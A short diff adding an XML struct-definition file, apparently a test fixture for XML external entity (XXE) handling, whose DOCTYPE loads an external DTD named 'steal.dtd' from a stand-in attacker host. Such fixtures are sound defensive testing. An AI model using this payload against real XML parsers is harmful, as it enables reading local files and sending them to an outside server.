@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE structs SYSTEM "http://evil.example.com/steal.dtd">
+<structs namespace="xxe">
+    <struct name="X" endian="BE">
+        <field name="v" type="cuchar"/>
+    </struct>
+</structs>
